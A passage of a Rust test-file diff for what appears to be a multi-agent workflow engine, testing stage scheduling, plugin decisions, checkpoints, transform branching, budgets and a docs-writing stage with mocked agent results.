+        matches!(err, GatePayload::StageReview { ref question, .. } if question.as_deref() == Some("Is the debug log shipped?"))
+    );
+    h.answer(
+        &g,
+        GateAnswer::Choice {
+            option: "no".into(),
+            text: None,
+        },
+    );
+    let req = h.spawn_step("spawn security-auditor stage audit#2");
+    assert_eq!(req.inputs.user_notes, vec!["no".to_string()]);
+}
+
+#[test]
+fn wf5_stop_and_on_fail_fail_end_the_session() {
+    let mut h = H::planned_with(workflow(AUDIT), one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        json!({"verdict": "needs_user", "summary": "s", "question": "q?", "options": ["a"]}),
+    );
+    h.stage_review("stop", None);
+    assert_eq!(h.summaries(), vec!["fail"]);
+
+    let mut h = H::planned_with(
+        workflow(&AUDIT.replace("on_fail = \"retry\"", "on_fail = \"fail\"")),
+        one_phase(),
+    );
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Fail, "A token is logged."),
+    );
+    assert_eq!(h.summaries(), vec!["fail"]);
+}
+
+#[test]
+fn wf4_stages_with_the_same_dependencies_run_side_by_side() {
+    let wf = workflow(&format!(
+        "{AUDIT}\n[[stage]]\nid = \"notes\"\nagent = \"release-notes\"\nafter = [\"build\"]\n"
+    ));
+    let mut h = H::planned_with(wf, one_phase());
+    h.pass_phase(1);
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn security-auditor stage audit#1",
+            "spawn release-notes stage notes#1"
+        ]
+    );
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Pass, "ok"),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn release-notes stage notes#1", "command format p"],
+        "closing waits only for the audit; the notes run on beside it"
+    );
+}
+
+#[test]
+fn wf4_a_phase_stage_runs_per_phase_and_holds_the_phases_after_it() {
+    let wf = workflow(
+        "extends = \"implement\"\ntrack = \"full\"\nremove = [\"track\", \"feedback\"]\n[[stage]]\nid = \"check\"\nagent = \"phase-checker\"\nscope = \"phase\"\n",
+    );
+    let mut h = H::planned_with(
+        wf,
+        json!([
+            phase(1, "p", &[], "Required"),
+            phase(2, "p", &[1], "Required")
+        ]),
+    );
+    h.pass_phase(1);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn phase-checker stage check phase:1 #1"],
+        "phase 2 waits for phase 1's check"
+    );
+    let req = h.spawn_step("spawn phase-checker stage check phase:1");
+    assert_eq!(req.inputs.phase.as_ref().map(|p| p.id), Some(1));
+    assert!(req.inputs.implementer_report.is_some());
+    h.run(
+        "spawn phase-checker stage check phase:1",
+        verdict(StageVerdict::Pass, "ok"),
+    );
+    assert_eq!(h.summaries(), vec!["spawn implementer phase 2 initial"]);
+    h.pass_phase(2);
+    h.run(
+        "spawn phase-checker stage check phase:2",
+        verdict(StageVerdict::Pass, "ok"),
+    );
+    assert_eq!(h.summaries(), vec!["command format p"]);
+}
+
+#[test]
+fn wf4_a_project_stage_runs_once_per_project() {
+    let wf = workflow(
+        "extends = \"research\"\n[[stage]]\nid = \"survey\"\nagent = \"surveyor\"\nscope = \"project\"\n",
+    );
+    let mut h = H::new(&["a", "b"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::ByCategory);
+    }
+    h.classify("RESEARCH", &["a", "b"]);
+    h.ev(SessionEvent::WorkflowResolved { workflow: wf });
+    h.run("spawn explore explore#0", explore_submit(0, &[]));
+    h.run("spawn explore explore#1", explore_submit(1, &[]));
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn surveyor stage survey project:a #1",
+            "spawn surveyor stage survey project:b #1"
+        ]
+    );
+    h.run(
+        "spawn surveyor stage survey project:a",
+        verdict(StageVerdict::Pass, "ok"),
+    );
+    h.run(
+        "spawn surveyor stage survey project:b",
+        verdict(StageVerdict::Pass, "ok"),
+    );
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+}
+
+#[test]
+fn wf6_a_stage_can_message_the_implementer_of_the_work_it_checks() {
+    let mut h = H::planned_with(workflow(AUDIT), one_phase());
+    h.pass_phase(1);
+    let (audit, _) = h.start("spawn security-auditor stage audit#1");
+    let st = h.state();
+    let list = st.list_agents(
+        &audit,
+        &[(AgentName::Explore, ostra_core::Contract::Research)],
+    );
+    assert!(list.contains("(the author of the spec)"), "{list}");
+    assert!(list.contains("(the author of the plan)"), "{list}");
+    let implementer = st
+        .executions
+        .values()
+        .find(|r| matches!(r.purpose, ExecPurpose::Implement { .. }))
+        .unwrap()
+        .id
+        .clone();
+    h.send(
+        &audit,
+        MessageTarget::Subagent {
+            id: implementer.clone(),
+        },
+        "Remove the token from the log line in src/auth.rs.",
+        true,
+    );
+    h.wait(&audit);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn implementer messages (continues)"]
+    );
+}
+
+// ------------------------------------------------------------------------------------------
+// PL3: a plugin's stage logic decides each step of its stage (HANDOVER 10.10).
+// ------------------------------------------------------------------------------------------
+
+use ostra_core::plugin::StageDecision;
+
+const GATED: &str = r#"
+extends = "implement"
+track = "full"
+remove = ["track", "feedback"]
+
+[[stage]]
+id = "release-gate"
+plugin = "acme:release"
+after = ["build"]
+before = ["closing"]
+max_rounds = 2
+"#;
+
+impl H {
+    fn decided(&mut self, decision: StageDecision) {
+        self.ev(SessionEvent::StageDecided {
+            node: "release-gate".into(),
+            scope: None,
+            decision,
+        });
+    }
+}
+
+#[test]
+fn pl3_a_plugin_runs_an_agent_and_decides_again_on_its_result() {
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    assert_eq!(h.summaries(), vec!["decide-stage release-gate"]);
+    h.decided(StageDecision::Run {
+        agent: "release-checker".into(),
+        instructions: Some("Check the changelog.".into()),
+    });
+    let req = h.spawn_step("spawn release-checker stage release-gate#1");
+    assert_eq!(
+        req.inputs.instructions.as_deref(),
+        Some("Check the changelog.")
+    );
+    h.run(
+        "spawn release-checker stage release-gate#1",
+        verdict(StageVerdict::Fail, "No changelog entry."),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["decide-stage release-gate"],
+        "the plugin, not the run's verdict, decides what follows"
+    );
+    h.decided(StageDecision::Pass {
+        summary: "Accepted.".into(),
+    });
+    assert_eq!(h.summaries(), vec!["command format p"]);
+}
+
+#[test]
+fn pl3_a_plugin_asks_the_user_and_hears_the_answer() {
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    h.decided(StageDecision::Ask {
+        question: "Ship on Friday?".into(),
+        options: vec!["yes".into(), "no".into()],
+    });
+    h.stage_review("no", None);
+    assert_eq!(h.summaries(), vec!["decide-stage release-gate"]);
+    let st = h.state();
+    let t = st.stage_track("release-gate", None).unwrap();
+    assert_eq!(t.notes, vec!["no".to_string()]);
+}
+
+#[test]
+fn pl3_a_plugin_failure_or_too_many_runs_asks_the_user() {
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    for n in 1..=2 {
+        h.decided(StageDecision::Run {
+            agent: "release-checker".into(),
+            instructions: None,
+        });
+        h.run(
+            &format!("spawn release-checker stage release-gate#{n}"),
+            verdict(StageVerdict::Pass, "ok"),
+        );
+    }
+    h.decided(StageDecision::Run {
+        agent: "release-checker".into(),
+        instructions: None,
+    });
+    assert_eq!(h.summaries(), vec!["gate stage_review"], "max_rounds is 2");
+    h.stage_review("continue", None);
+    assert_eq!(h.summaries(), vec!["command format p"]);
+
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    h.decided(StageDecision::Fail {
+        summary: "Release frozen.".into(),
+    });
+    assert_eq!(h.summaries(), vec!["gate stage_review"]);
+    h.stage_review("stop", None);
+    assert_eq!(h.summaries(), vec!["fail"]);
+}
+
+// ------------------------------------------------------------------------------------------
+// CA5, WF8, PL5: any agent fills a built-in stage by contract, and plugins handle their own
+// contracts' results.
+// ------------------------------------------------------------------------------------------
+
+#[test]
+fn wf8_a_built_in_stage_runs_the_agent_its_workflow_binds() {
+    let wf = workflow(&format!(
+        "{AUDIT}\n[agents]\nreview = \"strict-reviewer\"\nspec = \"house-spec\"\n"
+    ));
+    let mut h = H::with_workflow(&["p"], wf);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn house-spec spec#1"],
+        "the spec stage runs the agent bound to `spec`"
+    );
+    h.run("spawn house-spec spec#1", spec_submit(0, 1));
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn fact-check fact-check-spec#1"],
+        "an unbound contract runs the standard agent"
+    );
+    h.run(
+        "spawn fact-check fact-check-spec",
+        fact("PASS", "spec", &[]),
+    );
+    let g = h.open_gate("spec_approval");
+    h.answer(
+        &g,
+        GateAnswer::Approval {
+            approved: true,
+            feedback: None,
+        },
+    );
+    h.decide(
+        JudgeKind::Stakes,
+        None,
+        json!({"stakes": "high", "reason": "r"}),
+    );
+    h.run("spawn plan", plan_submit(one_phase()));
+    h.run(
+        "spawn fact-check fact-check-plan",
+        fact("PASS", "plan", &[]),
+    );
+    let g = h.open_gate("plan_approval");
+    h.answer(
+        &g,
+        GateAnswer::Approval {
+            approved: true,
+            feedback: None,
+        },
+    );
+    h.run(
+        "spawn implementer phase 1 initial",
+        impl_submit(1, &["src/a.rs"]),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn strict-reviewer review phase 1 #1"],
+        "the build's review runs the bound reviewer, and the fold reads its review by contract"
+    );
+    h.run("spawn strict-reviewer review phase 1 #1", review(&[]));
+    let st = h.state();
+    assert!(
+        st.ext.os().phases[&1].impl_loop.is_done()
+            || !st.ext.os().phases[&1].impl_loop.is_terminal()
+    );
+}
+
+#[test]
+fn pl5_a_plugin_contract_result_waits_for_its_handler() {
+    let wf =
+        workflow("extends = \"research\"\n[[stage]]\nid = \"notes\"\nagent = \"note-writer\"\n");
+    let mut h = H::with_workflow(&["p"], wf);
+    let req = h.spawn_step("spawn note-writer stage notes#1");
+    let id = ExecutionId::new();
+    h.ev(SessionEvent::ExecutionStarted {
+        projects: Vec::new(),
+        id: id.clone(),
+        agent: req.agent,
+        purpose: req.purpose.clone(),
+        stage: req.stage,
+        project: req.project.clone(),
+        executor: ExecutorKind::Native,
+        model: "mock:m".into(),
+        params: json!({}),
+        spawn_block: String::new(),
+        report_path: None,
+        resumes: None,
+        contract: Some("acme:release-note".parse().unwrap()),
+    });
+    h.finish(
+        &id,
+        ExecutionStatus::Ok,
+        Some(json!({"title": "v2", "lines": 3})),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["handle-result"],
+        "the stage reads nothing until the plugin handled the result"
+    );
+    h.ev(SessionEvent::ResultHandled {
+        execution: id,
+        outcome: serde_json::from_value(verdict(StageVerdict::Pass, "Three lines.")).unwrap(),
+    });
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+    let st = h.state();
+    assert_eq!(
+        st.stage_track("notes", None)
+            .unwrap()
+            .last
+            .as_ref()
+            .unwrap()
+            .summary,
+        "Three lines."
+    );
+}
+
+#[test]
+fn ca5_runs_logged_before_contracts_follow_their_agent() {
+    let mut h = H::explored(&["p"], SessionOptions::default());
+    let (spec, _) = h.start("spawn generate-spec spec#1");
+    let st = h.state();
+    assert_eq!(st.executions[&spec].contract, ostra_core::Contract::Spec);
+}
+
+#[test]
+fn pl5_a_plugin_stage_decides_only_after_its_result_is_handled() {
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    h.decided(StageDecision::Run {
+        agent: "release-checker".into(),
+        instructions: None,
+    });
+    let req = h.spawn_step("spawn release-checker stage release-gate#1");
+    let id = ExecutionId::new();
+    h.ev(SessionEvent::ExecutionStarted {
+        projects: Vec::new(),
+        id: id.clone(),
+        agent: req.agent,
+        purpose: req.purpose.clone(),
+        stage: req.stage,
+        project: req.project.clone(),
+        executor: ExecutorKind::Native,
+        model: "mock:m".into(),
+        params: json!({}),
+        spawn_block: String::new(),
+        report_path: None,
+        resumes: None,
+        contract: Some("acme:release-note".parse().unwrap()),
+    });
+    h.finish(&id, ExecutionStatus::Ok, Some(json!({"lines": 3})));
+    assert_eq!(
+        h.summaries(),
+        vec!["handle-result"],
+        "the plugin is not asked to decide before its handler shaped the result"
+    );
+    h.ev(SessionEvent::ResultHandled {
+        execution: id,
+        outcome: serde_json::from_value(verdict(StageVerdict::Pass, "ok")).unwrap(),
+    });
+    assert_eq!(h.summaries(), vec!["decide-stage release-gate"]);
+}
+
+// ------------------------------------------------------------------------------------------
+// PL8: a plugin's checkpoints live in the session's log and never move the workflow.
+// ------------------------------------------------------------------------------------------
+
+impl H {
+    fn checkpoint(&mut self, key: &str, value: Option<serde_json::Value>) {
+        self.ev(SessionEvent::PluginCheckpoint {
+            plugin: "acme".into(),
+            key: key.into(),
+            value,
+        });
+    }
+}
+
+#[test]
+fn pl8_checkpoints_are_kept_in_the_log_and_decide_nothing() {
+    let mut h = H::planned_with(workflow(GATED), one_phase());
+    h.pass_phase(1);
+    h.decided(StageDecision::Run {
+        agent: "release-checker".into(),
+        instructions: None,
+    });
+    let (run, _) = h.start("spawn release-checker stage release-gate#1");
+    h.checkpoint("progress", Some(serde_json::json!({"step": 2})));
+    h.checkpoint("scratch", Some(serde_json::json!(true)));
+    h.checkpoint("scratch", None);
+    assert_eq!(
+        h.summaries(),
+        Vec::<String>::new(),
+        "a save while the run works starts nothing and asks nothing"
+    );
+    h.finish(
+        &run,
+        ExecutionStatus::Ok,
+        Some(verdict(StageVerdict::Pass, "ok")),
+    );
+    assert_eq!(h.summaries(), vec!["decide-stage release-gate"]);
+    let st = h.state();
+    assert_eq!(
+        st.plugin_checkpoints.get("acme"),
+        Some(&std::collections::BTreeMap::from([(
+            "progress".to_string(),
+            serde_json::json!({"step": 2})
+        )]))
+    );
+    assert_eq!(st.checkpoint_saves.get("acme"), Some(&3));
+}
+
+// ------------------------------------------------------------------------------------------
+// WB2 to WB5: workflow builder nodes: transforms, prompts, inputs, and conditions (HANDOVER 10.11).
+// ------------------------------------------------------------------------------------------
+
+const BRANCH: &str = r#"
+extends = "implement"
+track = "full"
+remove = ["track", "feedback"]
+
+[[stage]]
+id = "audit"
+agent = "security-auditor"
+after = ["build"]
+before = ["closing"]
+
+[[stage]]
+id = "auth"
+transform = "filter"
+after = ["audit"]
+before = ["closing"]
+inputs = { items = "audit.findings" }
+args = { field = "file", op = "eq", to = "src/auth.rs" }
+
+[[stage]]
+id = "fix"
+agent = "security-fixer"
+after = ["auth"]
+before = ["closing"]
+inputs = { files = "auth.output" }
+when = [{ ref = "auth.output", op = "not_empty" }]
+
+[[stage]]
+id = "notes"
+agent = "release-notes"
+after = ["auth"]
+before = ["closing"]
+when = [{ ref = "auth.output", op = "empty" }]
+"#;
+
+impl H {
+    /// Rule WB2: run a node in the engine as the runner does, and record what it gave.
+    fn run_node(&mut self, node: &str) {
+        let st = self.state();
+        let d = st.workflow.as_ref().unwrap().stage(node).unwrap().clone();
+        let round = st.stage_track(node, None).map(|t| t.round).unwrap_or(0) + 1;
+        let ostra_core::workflow::StageRun::Transform { function } = &d.run else {
+            panic!("{node} is not a transform");
+        };
+        let functions = st.workflow.as_ref().unwrap().functions.clone();
+        let out = ostra_core::transform::run_function(
+            function,
+            &st.node_inputs(&d, None),
+            &d.args,
+            &functions,
+        );
+        self.ev(SessionEvent::NodeRan {
+            node: node.into(),
+            scope: None,
+            round,
+            output: out.as_ref().ok().cloned(),
+            error: out.err(),
+            cost_usd: 0.0,
+        });
+    }
+}
+
+#[test]
+fn wb2_wb4_wb5_a_transform_picks_the_branch_that_runs() {
+    let mut h = H::planned_with(workflow(BRANCH), one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Pass, "One finding."),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["run-node auth #1"],
+        "WB2: the transform runs once the audit it reads is done"
+    );
+    h.run_node("auth");
+    assert_eq!(
+        h.state().node_value("auth", None)["output"][0]["file"],
+        json!("src/auth.rs")
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn security-fixer stage fix#1", "skip-stage notes"],
+        "WB5: the branch whose condition holds runs, the other is skipped"
+    );
+    let req = h.spawn_step("spawn security-fixer stage fix#1");
+    assert!(
+        req.inputs.stage_inputs[0].starts_with("files = [{"),
+        "WB4: the agent is given its inputs: {:?}",
+        req.inputs.stage_inputs
+    );
+    h.ev(SessionEvent::StageSkipped {
+        node: "notes".into(),
+        scope: None,
+    });
+    h.run(
+        "spawn security-fixer stage fix#1",
+        verdict(StageVerdict::Pass, "Fixed."),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["command format p"],
+        "a skipped node counts as done, so closing goes on"
+    );
+}
+
+#[test]
+fn wb5_the_other_branch_runs_when_the_transform_finds_nothing() {
+    let mut h = H::planned_with(workflow(BRANCH), one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        json!({"verdict": "pass", "summary": "Clean.", "findings": []}),
+    );
+    h.run_node("auth");
+    assert_eq!(
+        h.summaries(),
+        vec!["skip-stage fix", "spawn release-notes stage notes#1"]
+    );
+}
+
+const PROMPT: &str = r#"
+extends = "research"
+
+[[stage]]
+id = "summary"
+prompt = "Name the three facts the research settled."
+inputs = { docs = "research.research_docs" }
+output_schema = { type = "object", required = ["facts"], properties = { facts = { type = "array" } } }
+"#;
+
+#[test]
+fn wb3_a_failed_prompt_node_asks_the_user_and_runs_again() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::ByCategory);
+    }
+    h.classify("RESEARCH", &["p"]);
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: workflow(PROMPT),
+    });
+    h.run("spawn explore explore#0", explore_submit(0, &[]));
+    h.decide(
+        JudgeKind::Sufficiency,
+        None,
+        json!({"sufficient": true, "gaps": [], "reason": "r"}),
+    );
+    assert_eq!(h.summaries(), vec!["run-node summary #1"]);
+    h.ev(SessionEvent::NodeRan {
+        node: "summary".into(),
+        scope: None,
+        round: 1,
+        output: None,
+        error: Some("the answer did not match the output schema".into()),
+        cost_usd: 0.25,
+    });
+    assert_eq!(
+        h.state().spent_usd(),
+        0.25,
+        "WB3: a prompt node's cost counts"
+    );
+    h.stage_review("retry", Some("List file paths, not prose."));
+    assert_eq!(h.summaries(), vec!["run-node summary #2"]);
+    h.ev(SessionEvent::NodeRan {
+        node: "summary".into(),
+        scope: None,
+        round: 2,
+        output: Some(json!({"facts": ["a", "b", "c"]})),
+        error: None,
+        cost_usd: 0.25,
+    });
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+}
+
+#[test]
+fn wb3_the_budget_holds_a_prompt_node_but_not_a_transform() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::ByCategory);
+    }
+    h.classify("RESEARCH", &["p"]);
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: workflow(&format!(
+            "{PROMPT}\n[[stage]]\nid = \"n\"\ntransform = \"constant\"\nafter = [\"research\"]\nargs = {{ value = 1 }}\n"
+        )),
+    });
+    h.run("spawn explore explore#0", explore_submit(0, &[]));
+    h.decide(
+        JudgeKind::Sufficiency,
+        None,
+        json!({"sufficient": true, "gaps": [], "reason": "r"}),
+    );
+    h.ctx.budget_usd = Some(0.0);
+    assert_eq!(h.summaries(), vec!["gate budget_reached", "run-node n #1"]);
+}
+
+// ------------------------------------------------------------------------------------------
+// WF9: default workflows are TOML files, and a workspace's copy wins.
+// ------------------------------------------------------------------------------------------
+
+#[test]
+fn wf9_a_session_runs_the_workspace_copy_of_its_category() {
+    let copy: WorkflowFile = toml::from_str(
+        "base = \"research\"\n[[stage]]\nid = \"research\"\nuses = \"ostra:research\"\n[[stage]]\nid = \"notes\"\nagent = \"release-notes\"\n",
+    )
+    .unwrap();
+    let set = WorkflowSet {
+        files: [("research".to_string(), copy)].into_iter().collect(),
+        ..ostra_default_plugin::workflow_set()
+    };
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::ByCategory);
+    }
+    h.classify("RESEARCH", &["p"]);
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: set.default_for(Category::Research).unwrap(),
+    });
+    h.run("spawn explore explore#0", explore_submit(0, &[]));
+    h.decide(
+        JudgeKind::Sufficiency,
+        None,
+        json!({"sufficient": true, "gaps": [], "reason": "r"}),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn release-notes stage notes#1"],
+        "the workspace's copy of the research workflow adds its own stage"
+    );
+}
+
+// ------------------------------------------------------------------------------------------
+// WB7: composite transform functions, recorded with the workflow.
+// ------------------------------------------------------------------------------------------
+
+#[test]
+fn wb7_a_composite_is_recorded_with_the_workflow_and_runs_its_steps() {
+    let function: ostra_core::transform::FunctionFile = toml::from_str(
+        "output = \"files\"\n[[input]]\nname = \"findings\"\nkind = \"array\"\n[[step]]\nid = \"files\"\ntransform = \"map\"\ninputs = { items = \"input.findings\" }\nargs = { field = \"file\" }\n",
+    )
+    .unwrap();
+    let text = BRANCH
+        .replace("transform = \"filter\"", "transform = \"files-of\"")
+        .replace(
+            "inputs = { items = \"audit.findings\" }",
+            "inputs = { findings = \"audit.findings\" }",
+        )
+        .replace(
+            "args = { field = \"file\", op = \"eq\", to = \"src/auth.rs\" }\n",
+            "",
+        );
+    let file: WorkflowFile = toml::from_str(&text).unwrap();
+    let wf = WorkflowSet {
+        files: [("w".to_string(), file)].into_iter().collect(),
+        functions: [("files-of".to_string(), function)].into_iter().collect(),
+        ..ostra_default_plugin::workflow_set()
+    }
+    .resolve("w")
+    .unwrap();
+    assert!(
+        wf.functions.contains_key("files-of"),
+        "the session's log holds the function, so an edit of its file never changes the run"
+    );
+    let mut h = H::planned_with(wf, one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Pass, "One finding."),
+    );
+    assert_eq!(h.summaries(), vec!["run-node auth #1"]);
+    h.run_node("auth");
+    assert_eq!(
+        h.state().stage_track("auth", None).unwrap().output,
+        Some(json!(["src/auth.rs"]))
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn security-fixer stage fix#1", "skip-stage notes"]
+    );
+}
+
+// ------------------------------------------------------------------------------------------
+// PL6 and PL7: workflows and transform functions a plugin builds in code.
+// ------------------------------------------------------------------------------------------
+
+#[test]
+fn pl6_pl7_a_plugin_workflow_resolves_by_name_and_records_its_plugin_transforms() {
+    use ostra_core::transform::{TransformInfo, ValueKind};
+    let manifest = ostra_core::plugin::PluginManifest {
+        name: "lib".into(),
+        workflows: vec![ostra_core::plugin::PluginWorkflow {
+            name: "flow".into(),
+            workflow: toml::from_str(
+                "extends = \"ostra:research\"\n[[stage]]\nid = \"n\"\ntransform = \"constant\"\nargs = { value = 21 }\n[[stage]]\nid = \"twice\"\ntransform = \"lib:double\"\ninputs = { value = \"n.output\" }\n",
+            )
+            .unwrap(),
+        }],
+        transforms: vec![TransformInfo {
+            name: "double".into(),
+            description: "Twice a number.".into(),
+            inputs: vec![ostra_core::transform::TransformParam {
+                name: "value".into(),
+                kind: ValueKind::Number,
+                required: true,
+                description: String::new(),
+            }],
+            variadic: false,
+            args: vec![],
+            output: ValueKind::Number,
+            custom: false,
+            plugin: None,
+        }],
+        ..Default::default()
+    };
+    let mut set = ostra_default_plugin::workflow_set();
+    set.add_plugin("lib", &manifest);
+    let wf = set.resolve("lib:flow").unwrap();
+    assert_eq!(wf.name, "lib:flow");
+    assert_eq!(
+        wf.plugin_transforms["lib:double"].plugin.as_deref(),
+        Some("lib"),
+        "the session's log holds what the plugin function takes and gives"
+    );
+    assert!(
+        set.resolve("lib:nope").is_err() && set.resolve("other:flow").is_err(),
+        "only a running plugin's workflows resolve"
+    );
+
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::Named {
+            name: "lib:flow".into(),
+        });
+    }
+    assert_eq!(h.summaries(), vec!["resolve-workflow lib:flow"]);
+    h.ev(SessionEvent::WorkflowResolved { workflow: wf });
+    h.classify("RESEARCH", &["p"]);
+    h.run("spawn explore explore#0", explore_submit(0, &[]));
+    h.decide(
+        JudgeKind::Sufficiency,
+        None,
+        json!({"sufficient": true, "gaps": [], "reason": "r"}),
+    );
+    h.run_node("n");
+    assert_eq!(
+        h.summaries(),
+        vec!["run-node twice #1"],
+        "PL7: the planner runs a plugin's function like any transform; the runner calls the plugin"
+    );
+}
+
+// -------------------------------------------------------------------------------------------------
+// Rule B10: the book stage after closing
+// -------------------------------------------------------------------------------------------------
+
+/// A DOCS session that recorded `wf` as its workflow.
+fn docs_on(wf: WorkflowDef) -> H {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
+    h.ev(SessionEvent::WorkflowResolved { workflow: wf });
+    h
+}
+
+#[test]
+fn b10_the_book_stage_writes_the_docs_after_closing() {
+    let mut h = docs_on(ostra_default_plugin::workflow(Category::Docs));
+    assert_eq!(h.summaries(), vec!["scan-docs p"]);
+    assert_eq!(
+        h.state().ref_value("closing.docs", Some("project:p")),
+        json!(true),
+        "a project's instance reads its own closing choice"
+    );
+    assert_eq!(h.state().ref_value("closing.docs", None), json!(["p"]));
+    finish_session_docs(&mut h, &["p"]);
+    assert_eq!(h.summaries(), vec!["write-book p"]);
+    h.ev(SessionEvent::BookWritten {
+        book: "p".into(),
+        projects: vec!["p".into()],
+        error: None,
+    });
+    assert_eq!(h.state().ref_value("docs.book", None), json!("p"));
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+}
+
+#[test]
+fn b10_a_workflow_without_a_book_stage_writes_the_docs_in_closing() {
+    let wf = workflow("base = \"docs\"\n[[stage]]\nid = \"closing\"\nuses = \"ostra:closing\"\n");
+    assert_eq!(wf.notices().len(), 1, "the deprecated path names its fix");
+    let mut h = docs_on(wf);
+    assert_eq!(h.summaries(), vec!["scan-docs p"]);
+    finish_session_docs(&mut h, &["p"]);
+    assert_eq!(h.summaries(), vec!["write-book p"]);
+    h.ev(SessionEvent::BookWritten {
+        book: "p".into(),
+        projects: vec!["p".into()],
+        error: None,
+    });
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+}
+
+/// Two projects through the build with tests and docs requested: `a` has a phase to test, and
+/// `b` has none.
+fn two_projects_closing(recorded: bool) -> H {
+    let phases = json!([phase(1, "a", &[], "Required"), phase(2, "b", &[], "Skip")]);
+    let mut h = H::plan_approved(
+        &["a", "b"],
+        phases,
+        SessionOptions {
+            tests: true,
+            docs: true,
+            yolo: false,
+            track: None,
+        },
+    );
+    if recorded {
+        h.ev(SessionEvent::WorkflowResolved {
+            workflow: ostra_default_plugin::workflow(Category::Implement),
+        });
+    }
+    h.pass_phase(1);
+    h.pass_phase(2);
+    h.accept();
+    h.command(CommandPurpose::Format, "a");
+    h.command(CommandPurpose::Format, "b");
+    h
+}
+
+#[test]
+fn b10_the_book_stage_waits_for_every_projects_tests() {
+    let old = two_projects_closing(false);
+    assert_eq!(
+        old.summaries(),
+        vec!["spawn execution-path-analyzer epa phase 1", "scan-docs b"],
+        "without a recorded workflow, closing documents b beside a's tests"
+    );
+    let mut h = two_projects_closing(true);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn execution-path-analyzer epa phase 1"],
+        "the book stage waits for the closing stage"
+    );
+    h.run("spawn execution-path-analyzer", report("/e1"));
+    h.run("spawn write-test write-test phase 1", report("/t1"));
+    h.run("spawn code-reviewer", review(&[]));
+    h.command(CommandPurpose::Stage, "a");
+    assert_eq!(h.summaries(), vec!["scan-docs a", "scan-docs b"]);
+}
+
+// -------------------------------------------------------------------------------------------------
+// Rules B1 and B10: one session-wide docs pipeline, with a part across projects
+// -------------------------------------------------------------------------------------------------
+
+fn scanned_wide(project: &str, modules: &[&str]) -> SessionEvent {
+    match scanned(project, modules, &[]) {
+        SessionEvent::DocsScanned {
+            project,
+            modules,
+            refs,
+            ..
+        } => SessionEvent::DocsScanned {
+            project,
+            modules,
+            refs,
+            session_wide: true,
+        },
+        _ => unreachable!(),
+    }
+}
+
+/// The session-wide docs pipeline to the end: a scan of each project, a survey of one page, its
+/// draft, a passing check, and a synthesis pass that finds the book done.
+fn finish_session_docs(h: &mut H, projects: &[&str]) {
+    for p in projects {
+        if h.summaries().contains(&format!("scan-docs {p}")) {
+            h.ev(scanned_wide(p, &[]));
+        }
+    }
+    h.run(
+        "spawn documentation docs-survey _session",
+        survey_submit(projects[0], &[("orders", true)]),
+    );
+    h.run(
+        "spawn documentation docs _session/orders",
+        page_submit(projects[0], "orders", CLEAN),
+    );
+    h.run(
+        "spawn fact-check docs-check _session/orders round 1",
+        check_submit(true),
+    );
+    h.run(
+        "spawn documentation docs-synthesis _session round 1",
+        synthesis_submit(true, vec![]),
+    );
+}
+
+/// A DOCS session over `projects` that recorded the default docs workflow.
+fn docs_wide(projects: &[&str]) -> H {
+    let mut h = H::new(projects, SessionOptions::default());
